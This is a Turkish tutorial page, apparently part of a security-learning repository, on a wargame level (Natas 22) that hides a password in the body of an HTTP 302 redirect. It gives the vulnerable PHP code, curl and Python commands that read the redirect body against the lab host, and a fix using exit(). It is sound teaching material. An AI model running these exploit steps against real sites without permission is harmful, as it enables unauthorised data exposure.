# 🌐 Web Güvenliği — HTTP Redirect Bypass

> Sunucu seni başka bir sayfaya yönlendiriyor.
> Ama yönlendirmeden önce bir şeyler söylüyor — tarayıcın onu göstermiyor.

---

## 📋 İçindekiler

- [HTTP Redirect Nasıl Çalışır?](#http-redirect-nasıl-çalışır)
- [302 Response Body](#302-response-body)
- [Redirect'i Takip Etmeme](#redirecti-takip-etmeme)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## HTTP Redirect Nasıl Çalışır?

Sunucu 301 veya 302 status kodu ile birlikte `Location` header'ı döndürdüğünde tarayıcı otomatik olarak yeni URL'e gider.

```
Tarayıcı → GET /secret.php
Sunucu   → HTTP/1.1 302 Found
             Location: /login.php
Tarayıcı → GET /login.php   (otomatik yönlendi)
```

Tarayıcı 302 response'undaki **body'yi göstermez** — direkt yeni URL'e gider.

### 302 Response'un Body'si

Sunucu 302 döndürürken body de gönderebilir:

```
HTTP/1.1 302 Found
Location: /login.php
Content-Type: text/html

<html>
  <body>
    The password for natas23 is: [ŞİFRE BURADA!]
  </body>
</html>
```

Tarayıcı bu body'yi göstermeden `/login.php`'ye gider. Ama body gerçekten gönderilmiştir — sadece tarayıcı işlemez.

---

## Redirect'i Takip Etmeme

### curl ile

```bash
# Varsayılan: curl redirect'i takip ETMEZ
curl -u natas22:[şifre] http://natas22.natas.labs.overthewire.org/
# 302 response'unun body'si görünür

# -L ile redirect'i takip et (bu durumda body kaybolur)
curl -L -u natas22:[şifre] http://natas22.natas.labs.overthewire.org/
```

### Python requests ile

```python
import requests

# allow_redirects=False → redirect'i takip etme
r = requests.get(
    url,
    auth=(username, password),
    allow_redirects=False
)
print(r.text)   # 302 body'si
print(r.status_code)    # 302
print(r.headers['Location'])    # Nereye yönlendirecekti
```

### Burp Suite ile

Burp tüm istekleri ve response'ları yakalar — redirect olsa bile 302 body'si Burp'te görünür.

---

## Natas'ta Kullanım

### Natas 22 — 302 Body'sinde Şifre

**Kaynak kod:**

```php
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // admin değilsen yönlendir
    if(!($_SESSION and array_key_exists("admin", $_SESSION)
         and $_SESSION["admin"] == 1)) {
        header("Location: /");   // ← 302 redirect
    }
}
?>

<?php
    // Bu kod redirect'ten SONRA da çalışır!
    if(array_key_exists("revelio", $_GET)) {
        print "You are an admin. The password for natas23 is: <censored>";
    }
?>
```

**Sorun:** PHP `header("Location: /")` ile redirect söyler ama kod çalışmaya devam eder. Şifre yine de HTML'e yazılır — sadece tarayıcı bunu göstermeden yönlendirir.

**Exploit:**

```bash
# curl ile redirect'i takip etme
curl -u natas22:[şifre] \
     "http://natas22.natas.labs.overthewire.org/?revelio"
# Şifre body'de görünür
```

```python
import requests

r = requests.get(
    "http://natas22.natas.labs.overthewire.org/?revelio",
    auth=("natas22", "[şifre]"),
    allow_redirects=False
)
print(r.text)
```

---

### Neden Oluyor?

PHP'de `header()` ile redirect göndermek, kodun çalışmasını **durdurmaz**. Sonrasına `exit` veya `die` koymak gerekir:

```php
// KÖTÜ — header sonra kod çalışmaya devam eder
header("Location: /login.php");
echo "Gizli içerik";   // Bu hâlâ çalışır!

// İYİ — header + exit
header("Location: /login.php");
exit();
```

---

### HTTP Redirect — Kontrol Listesi

```
Tespit:
  ☐ Sayfa anında başka yere yönlendiriyor mu?
  ☐ URL'de ?revelio, ?debug, ?show gibi parametre denenebilir mi?
  ☐ Kaynak kodda header("Location:...") var mı?

Exploit:
  ☐ curl ile dene (varsayılan redirect takip etmez)
  ☐ Python requests → allow_redirects=False
  ☐ Burp Suite → 302 response body'sini gör
```

---

## 🔗 Kaynaklar

- [MDN — HTTP 302](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302)
- [PortSwigger — Unvalidated Redirects](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PHP — header()](https://www.php.net/manual/en/function.header.php)

---

**Önceki konu:** [15_session_ve_newline_injection.md](./15_session_ve_newline_injection.md)
**Sonraki konu:** [17_php_type_juggling.md](./17_php_type_juggling.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
